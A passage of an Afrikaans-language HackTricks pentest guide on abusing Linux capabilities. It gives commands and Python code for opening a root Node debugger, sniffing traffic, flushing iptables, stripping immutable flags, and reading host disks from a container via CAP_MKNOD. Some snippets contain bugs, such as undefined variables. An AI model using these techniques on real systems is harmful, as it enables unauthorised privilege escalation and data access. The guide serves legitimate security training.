As jy kill-vermoëns het en daar is 'n **node-program wat as root** (of as 'n ander gebruiker) loop, kan jy waarskynlik **die signaal SIGUSR1 stuur** en dit laat **die node-debugger oopmaak** waar jy kan koppel.
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) is die mees relevante kuberveiligheid geleentheid in **Spanje** en een van die belangrikste in **Europa**. Met **die missie om tegniese kennis te bevorder**, is hierdie kongres 'n kookpunt vir tegnologie en kuberveiligheid professionele in elke dissipline.

{% embed url="https://www.rootedcon.com/" %}

## CAP\_NET\_BIND\_SERVICE

**Dit beteken dat dit moontlik is om na enige poort te luister (selfs na bevoorregte poorte).** Jy kan nie voorregte direk verhoog met hierdie vermoë nie.

**Voorbeeld met binêre**

As **`python`** hierdie vermoë het, sal dit in staat wees om na enige poort te luister en selfs daarvandaan na enige ander poort te verbind (sommige dienste vereis verbindings vanaf spesifieke bevoorregte poorte)

{% tabs %}
{% tab title="Luister" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="Verbind" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html)-vermoë maak dit vir prosesse moontlik om **RAW- en PACKET-sokkels te skep**, wat hulle in staat stel om willekeurige netwerkpakkies te genereer en te stuur. Dit kan lei tot sekuriteitsrisiko's in gekonteneerde omgewings, soos pakketspoofing, verkeersinspuiting en omseil van netwerktoegangsbeheer. Kwaadwillige aktore kan dit uitbuit om te interfereer met gekonteneerde roeteverwerking of om die netwerksekuriteit van die gasheer in gevaar te stel, veral sonder voldoende firewallbeskerming. Daarbenewens is **CAP_NET_RAW** noodsaaklik vir bevoorregte gekonteneerde om operasies soos ping via RAW ICMP-versoeke te ondersteun.

**Dit beteken dat dit moontlik is om verkeer af te luister.** Jy kan nie direk voorregte verhoog met hierdie vermoë nie.

**Voorbeeld met binêre lêer**

As die binêre lêer **`tcpdump`** hierdie vermoë het, sal jy dit kan gebruik om netwerkinligting vas te vang.
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
Let wel dat as die **omgewing** hierdie vermoë gee, jy ook **`tcpdump`** kan gebruik om verkeer te onderskep.

**Voorbeeld met binêre 2**

Die volgende voorbeeld is **`python2`** kode wat nuttig kan wees om verkeer van die "**lo**" (**localhost**) koppelvlak te onderskep. Die kode kom van die laboratorium "_The Basics: CAP-NET\_BIND + NET\_RAW_" van [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP\_NET\_ADMIN + CAP\_NET\_RAW

[**CAP\_NET\_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) bevoegdheid geeft die houer die mag om netwerk konfigurasies te verander, insluitend firewall-instellings, roetetabelle, soket-toestemmings en netwerkinterface-instellings binne die blootgestelde netwerk namespaces. Dit maak ook dit moontlik om **promiskueuse modus** op netwerkinterfaces aan te skakel, wat pakketsnuffeling oor namespaces moontlik maak.

**Voorbeeld met binêre**

Laat ons aanneem dat die **python binêre** hierdie bevoegdhede het.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Dit beteken dat dit moontlik is om inode-eienskappe te wysig.** Jy kan nie direk voorregte verhoog met hierdie vermoë nie.

**Voorbeeld met binêre lêer**

As jy vind dat 'n lêer onveranderlik is en Python hierdie vermoë het, kan jy **die onveranderlike eienskap verwyder en die lêer wysigbaar maak:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Let daarop dat hierdie onveranderlike eienskap gewoonlik ingestel en verwyder word deur gebruik te maak van:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) maak die uitvoering van die `chroot(2)` stelseloproep moontlik, wat potensieel kan lei tot die ontsnapping uit `chroot(2)` omgewings deur bekende kwesbaarhede:

* [Hoe om uit verskillende chroot-oplossings te breek](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: chroot ontsnappingstool](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) maak nie net die uitvoering van die `reboot(2)` stelseloproep vir stelselherstarts moontlik nie, insluitend spesifieke bevele soos `LINUX_REBOOT_CMD_RESTART2` wat aangepas is vir sekere hardewareplatforms, maar dit maak ook die gebruik van `kexec_load(2)` en, vanaf Linux 3.17, `kexec_file_load(2)` moontlik om nuwe of ondertekende afkraakkernels te laai.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is in Linux 2.6.37 van die breër **CAP_SYS_ADMIN** geskei en verleen spesifiek die vermoë om die `syslog(2)` oproep te gebruik. Hierdie vermoë maak dit moontlik om die kyk van kernel-adresse via `/proc` en soortgelyke koppelvlakke toe te laat wanneer die `kptr_restrict` instelling op 1 is, wat die blootstelling van kernel-adresse beheer. Sedert Linux 2.6.39 is die verstek vir `kptr_restrict` 0, wat beteken dat kernel-adresse blootgestel word, alhoewel baie verspreidings dit op 1 (versteek adresse behalwe van uid 0) of 2 (altans adresse) stel vir veiligheidsredes.

Daarbenewens maak **CAP_SYSLOG** toegang tot `dmesg` uitset moontlik wanneer `dmesg_restrict` op 1 gestel is. Ten spyte van hierdie veranderinge behou **CAP_SYS_ADMIN** die vermoë om `syslog`-handelinge uit te voer as gevolg van historiese voorbeelde.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) brei die funksionaliteit van die `mknod` stelseloproep uit om verder as die skep van gewone lêers, FIFO's (genoemde pype) of UNIX-domein-sokkels te gaan. Dit maak spesifiek die skep van spesiale lêers moontlik, wat onder andere insluit:

- **S_IFCHR**: Karakter spesiale lêers, wat toestelle soos terminale is.
- **S_IFBLK**: Blok spesiale lêers, wat toestelle soos skywe is.

Hierdie vermoë is noodsaaklik vir prosesse wat die vermoë benodig om toestel lêers te skep, wat direkte hardeware-interaksie deur middel van karakter- of bloktoestelle fasiliteer.

Dit is 'n verstek docker-vermoë ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Hierdie vermoë maak bevoorregte eskalasies (deur volle skyflees) op die gasheer moontlik, onder hierdie voorwaardes:

1. Het aanvanklike toegang tot die gasheer (Onbevoorreg).
2. Het aanvanklike toegang tot die houer (Bevoorreg (EUID 0), en effektiewe `CAP_MKNOD`).
3. Gasheer en houer moet dieselfde gebruikersnaamruimte deel.

**Stappe om 'n Bloktoestel in 'n Houer te Skep en Toegang te Kry:**

1. **Op die Gasheer as 'n Standaardgebruiker:**
- Bepaal jou huidige gebruikers-ID met `id`, byvoorbeeld `uid=1000(standarduser)`.
- Identifiseer die teikentoestel, byvoorbeeld `/dev/sdb`.

2. **Binne die Houer as `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Terug op die Gasheer:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
Hierdie benadering stel die standaardgebruiker in staat om toegang te verkry tot en potensieel data te lees vanaf `/dev/sdb` deur die houer te gebruik, deur gedeelde gebruikersnaamruimtes en toestemmings wat op die toestel ingestel is, uit te buit.


### CAP\_SETPCAP

**CAP_SETPCAP** stel 'n proses in staat om die kapasiteitsstelle van 'n ander proses te **verander**, wat die byvoeging of verwydering van kapasiteite uit die effektiewe, oordraagbare en toegelate stelle moontlik maak. 'n Proses kan egter slegs kapasiteite wysig wat dit in sy eie toegelate stel het, om te verseker dat dit nie die voorregte van 'n ander proses verhoog nie. Onlangse kernel-opdaterings het hierdie reëls verskerp deur `CAP_SETPCAP` slegs toe te laat om die kapasiteite binne sy eie of sy nageslagte se toegelate stelle te verminder, met die doel om sekuriteitsrisiko's te verminder. Gebruik vereis dat `CAP_SETPCAP` in die effektiewe stel is en die teikenkapasiteite in die toegelate stel, deur gebruik te maak van `capset()` vir wysigings. Dit som die kernfunksie en beperkings van `CAP_SETPCAP` op, en beklemtoon sy rol in voorregbestuur en sekuriteitsverbetering.

**`CAP_SETPCAP`** is 'n Linux-kapasiteit wat 'n proses in staat stel om die kapasiteitsstelle van 'n ander proses te **verander**. Dit gee die vermoë om kapasiteite by te voeg of te verwyder uit die effektiewe, oordraagbare en toegelate kapasiteitsstelle van ander prosesse. Daar is egter sekere beperkings op hoe hierdie kapasiteit gebruik kan word.

'n Proses met `CAP_SETPCAP` **kan slegs kapasiteite toeken of verwyder wat in sy eie toegelate kapasiteitsstel is**. Met ander woorde, 'n proses kan nie 'n kapasiteit aan 'n ander proses toeken as dit nie self daardie kapasiteit het nie. Hierdie beperking voorkom dat 'n proses die voorregte van 'n ander proses verhoog tot bo sy eie vlak van voorreg.

Verder is die `CAP_SETPCAP`-kapasiteit in onlangse kernelweergawes **verder beperk**. Dit laat nie meer toe dat 'n proses arbitrêr die kapasiteitsstelle van ander prosesse wysig nie. Dit **laat slegs toe dat 'n proses die kapasiteite in sy eie toegelate kapasiteitsstel of die toegelate kapasiteitsstel van sy nageslagte verminder**. Hierdie verandering is ingevoer om potensiële sekuriteitsrisiko's wat verband hou met die kapasiteit te verminder.

Om `CAP_SETPCAP` doeltreffend te gebruik, moet jy die kapasiteit in jou effektiewe kapasiteitsstel hê en die teikenkapasiteite in jou toegelate kapasiteitsstel hê. Jy kan dan die `capset()`-sisteemaanroep gebruik om die kapasiteitsstelle van ander prosesse te wysig.

Kortom, `CAP_SETPCAP` stel 'n proses in staat om die kapasiteitsstelle van ander prosesse te wysig, maar dit kan nie kapasiteite toeken wat dit self nie het nie. Verder is sy funksionaliteit in onlangse kernelweergawes beperk om slegs die vermindering van kapasiteite in sy eie toegelate kapasiteitsstel of die toegelate kapasiteitsstelle van sy nageslagte toe te laat as gevolg van sekuriteitskwessies.

## Verwysings

**Die meeste van hierdie voorbeelde is geneem uit sekere laboratoriums van** [**https://attackdefense.pentesteracademy.com/**](https://attackdefense.pentesteracademy.com), dus as jy hierdie voorregverhogingstegnieke wil oefen, beveel ek hierdie laboratoriums aan.

**Ander verwysings**:

* [https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
* [https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/#:\~:text=Inherited%20capabilities%3A%20A%20process%20can,a%20binary%2C%20e.g.%20using%20setcap%20.](https://www.schutzwerk.com/en/43/posts/linux\_container\_capabilities/)
* [https://linux-audit.com/linux-capabilities-101/](https://linux-audit.com/linux-capabilities-101/)
* [https://www.linuxjournal.com/article/5737](https://www.linuxjournal.com/article/5737)
* [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap\_sys\_module)
* [https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot](https://labs.withsecure.com/publications/abusing-the-access-to-mount-namespaces-through-procpidroot)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

[**RootedCON**](https://www.rootedcon.com/) is die mees relevante kuberveiligheidsevent in **Spanje** en een van die belangrikste in **Europa**. Met **die missie om tegniese kennis te bevorder**, is hierdie kongres 'n broeiplek vir tegnologie- en kuberveiligheidspesialiste in elke dissipline.

{% embed url="https://www.rootedcon.com/" %}

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks in PDF aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks-uitrusting**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>
